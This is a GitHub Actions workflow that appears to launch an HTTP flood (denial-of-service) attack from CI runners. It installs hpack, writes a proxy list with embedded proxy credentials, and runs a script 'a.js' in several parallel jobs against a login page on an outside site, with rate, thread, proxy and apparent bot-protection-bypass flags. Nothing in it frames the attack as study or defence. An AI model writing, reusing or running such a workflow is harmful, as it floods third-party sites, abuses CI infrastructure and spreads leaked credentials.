name: Run Script (20 Parallel Instances)

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  run-script:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        instance: [1,2,3,4]
    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '18'

    - name: Install dependencies
      run: |
        npm init -y
        npm install hpack chalk@4

    - name: Create proxy file
      run: |
        cat > 11.txt << 'EOF'
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
        EOF

    - name: Run a.js (Instance ${{ matrix.instance }})
      run: |
        node a.js GET https://xbossop.shop/login 700 1 1  11.txt --bfm --debug --auth
